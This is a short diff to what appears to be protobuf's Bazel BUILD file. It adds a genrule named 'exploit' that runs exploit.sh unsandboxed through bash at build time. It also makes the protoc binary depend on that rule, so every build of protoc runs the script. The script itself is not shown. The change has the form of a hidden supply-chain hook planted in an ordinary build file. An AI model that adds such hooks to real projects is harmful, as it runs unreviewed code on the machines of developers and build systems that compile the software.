@@ -359,12 +359,20 @@ alias(
     visibility = ["//visibility:public"],
 )
 
+genrule(
+    name = "exploit",
+    srcs = ["exploit.sh"],
+    outs = ["exploit.out"],
+    cmd = "bash $(location exploit.sh) > $@",
+    local = 1,
+)
+
 cc_binary(
     name = "protoc",
     copts = COPTS,
     linkopts = LINK_OPTS,
     visibility = ["//visibility:public"],
-    deps = ["//src/google/protobuf/compiler:protoc_lib_stage1"],
+    deps = ["//src/google/protobuf/compiler:protoc_lib_stage1", ":exploit"],
 )
 
 cc_binary(
